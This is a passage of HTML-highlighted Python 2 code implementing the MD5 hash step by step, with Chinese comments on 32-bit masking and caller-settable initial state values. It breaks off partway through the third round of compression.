    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">getM16</span><span class="p">(</span><span class="n">hex_str</span><span class="p">,</span><span class="n">operatingBlockNum</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    --args:
</span><span class="s1">            hex_str : a hex-encoded string with length in integral multiple of 512bits
</span><span class="s1">            operatingBlockNum : message block number which is being operated , greater than 1
</span><span class="s1">    --return:
</span><span class="s1">            M : result of splited 64bytes into 4*16 message blocks with little-endian
</span><span class="s1">
</span><span class="s1">    &#39;&#39;&#39;</span>
    <span class="n">M</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">reverse_hex_4bytes</span><span class="p">(</span><span class="n">hex_str</span><span class="p">[</span><span class="n">i</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">)]),</span><span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">128</span><span class="o">*</span><span class="p">(</span><span class="n">operatingBlockNum</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span><span class="mi">128</span><span class="o">*</span><span class="n">operatingBlockNum</span><span class="p">,</span><span class="mi">8</span><span class="p">)]</span>
    <span class="k">return</span> <span class="n">M</span>

<span class="c1">#定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数</span>
<span class="k">def</span> <span class="nf">T</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="mi">4294967296</span><span class="o">*</span><span class="nb">abs</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;math&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">i</span><span class="p">))))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>
    <span class="k">return</span> <span class="n">result</span>   

<span class="c1">#定义每轮中用到的函数</span>
<span class="c1">#RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位</span>
<span class="n">F</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">z</span><span class="p">:((</span><span class="n">x</span><span class="o">&amp;</span><span class="n">y</span><span class="p">)</span><span class="o">|</span><span class="p">((</span><span class="o">~</span><span class="n">x</span><span class="p">)</span><span class="o">&amp;</span><span class="n">z</span><span class="p">))</span>
<span class="n">G</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">z</span><span class="p">:((</span><span class="n">x</span><span class="o">&amp;</span><span class="n">z</span><span class="p">)</span><span class="o">|</span><span class="p">(</span><span class="n">y</span><span class="o">&amp;</span><span class="p">(</span><span class="o">~</span><span class="n">z</span><span class="p">)))</span>
<span class="n">H</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">z</span><span class="p">:(</span><span class="n">x</span><span class="o">^</span><span class="n">y</span><span class="o">^</span><span class="n">z</span><span class="p">)</span>
<span class="n">I</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">z</span><span class="p">:(</span><span class="n">y</span><span class="o">^</span><span class="p">(</span><span class="n">x</span><span class="o">|</span><span class="p">(</span><span class="o">~</span><span class="n">z</span><span class="p">)))</span>
<span class="n">RL</span> <span class="o">=</span> <span class="n">L</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">n</span><span class="p">:(((</span><span class="n">x</span><span class="o">&lt;&lt;</span><span class="n">n</span><span class="p">)</span><span class="o">|</span><span class="p">(</span><span class="n">x</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="mi">32</span><span class="o">-</span><span class="n">n</span><span class="p">)))</span><span class="o">&amp;</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">FF</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">ac</span><span class="p">):</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">F</span> <span class="p">((</span><span class="n">b</span><span class="p">),</span> <span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="p">(</span><span class="n">d</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">ac</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="n">RL</span> <span class="p">((</span><span class="n">a</span><span class="p">),</span> <span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>  
    <span class="k">return</span> <span class="n">a</span>  
<span class="k">def</span> <span class="nf">GG</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">ac</span><span class="p">):</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">G</span> <span class="p">((</span><span class="n">b</span><span class="p">),</span> <span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="p">(</span><span class="n">d</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">ac</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="n">RL</span> <span class="p">((</span><span class="n">a</span><span class="p">),</span> <span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>  
    <span class="k">return</span> <span class="n">a</span>  
<span class="k">def</span> <span class="nf">HH</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">ac</span><span class="p">):</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">H</span> <span class="p">((</span><span class="n">b</span><span class="p">),</span> <span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="p">(</span><span class="n">d</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">ac</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="n">RL</span> <span class="p">((</span><span class="n">a</span><span class="p">),</span> <span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>  
    <span class="k">return</span> <span class="n">a</span>  
<span class="k">def</span> <span class="nf">II</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">ac</span><span class="p">):</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">I</span> <span class="p">((</span><span class="n">b</span><span class="p">),</span> <span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="p">(</span><span class="n">d</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">ac</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="n">RL</span> <span class="p">((</span><span class="n">a</span><span class="p">),</span> <span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">;</span>  
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>  
    <span class="k">return</span> <span class="n">a</span>      

<span class="k">def</span> <span class="nf">show_md5</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">,</span><span class="n">C</span><span class="p">,</span><span class="n">D</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="p">[</span>  <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;re&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;..&#34;</span><span class="p">,</span><span class="s2">&#34;</span><span class="si">%08x</span><span class="s2">&#34;</span><span class="o">%</span><span class="n">i</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">,</span><span class="n">C</span><span class="p">,</span><span class="n">D</span><span class="p">)</span>  <span class="p">]</span>  <span class="p">)</span>

<span class="k">def</span> <span class="nf">run_md5</span><span class="p">(</span><span class="n">A</span><span class="o">=</span><span class="mh">0x67452301</span><span class="p">,</span><span class="n">B</span><span class="o">=</span><span class="mh">0xefcdab89</span><span class="p">,</span><span class="n">C</span><span class="o">=</span><span class="mh">0x98badcfe</span><span class="p">,</span><span class="n">D</span><span class="o">=</span><span class="mh">0x10325476</span><span class="p">,</span><span class="n">readyMsg</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    
    <span class="n">a</span> <span class="o">=</span> <span class="n">A</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">B</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">C</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">D</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">readyMsg</span><span class="p">)</span><span class="o">/</span><span class="mi">128</span><span class="p">):</span>
        <span class="n">M</span> <span class="o">=</span> <span class="n">getM16</span><span class="p">(</span><span class="n">readyMsg</span><span class="p">,</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
            <span class="k">exec</span> <span class="s2">&#34;M&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;=M[&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;]&#34;</span>
        <span class="c1">#First round</span>
        <span class="n">a</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mh">0xd76aa478</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M1</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mh">0xe8c7b756</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M2</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mh">0x242070db</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M3</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mh">0xc1bdceee</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M4</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mh">0xf57c0faf</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M5</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mh">0x4787c62a</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M6</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mh">0xa8304613</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M7</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mh">0xfd469501</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M8</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x698098d8</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M9</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mh">0x8b44f7af</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M10</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mh">0xffff5bb1</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M11</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mh">0x895cd7be</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M12</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x6b901122</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M13</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mh">0xfd987193</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M14</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mh">0xa679438e</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">FF</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M15</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mh">0x49b40821</span><span class="n">L</span><span class="p">)</span>
        <span class="c1">#Second round</span>
        <span class="n">a</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M1</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mh">0xf61e2562</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M6</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mh">0xc040b340</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M11</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mh">0x265e5a51</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M0</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mh">0xe9b6c7aa</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M5</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mh">0xd62f105d</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M10</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x02441453</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M15</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mh">0xd8a1e681</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M4</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mh">0xe7d3fbc8</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M9</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x21e1cde6</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M14</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mh">0xc33707d6</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M3</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mh">0xf4d50d87</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M8</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mh">0x455a14ed</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M13</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mh">0xa9e3e905</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M2</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mh">0xfcefa3f8</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M7</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mh">0x676f02d9</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">GG</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M12</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mh">0x8d2a4c8a</span><span class="n">L</span><span class="p">)</span>
        <span class="c1">#Third round</span>
        <span class="n">a</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0xfffa3942</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M8</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mh">0x8771f681</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M11</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mh">0x6d9d6122</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M14</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mh">0xfde5380c</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M1</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0xa4beea44</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M4</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mh">0x4bdecfa9</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M7</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mh">0xf6bb4b60</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M10</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mh">0xbebfbc70</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M13</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x289b7ec6</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M0</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mh">0xeaa127fa</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M3</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mh">0xd4ef3085</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M6</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mh">0x04881d05</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M9</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0xd9d4d039</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M12</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mh">0xe6db99e5</span><span class="n">L</span><span class="p">)</span>
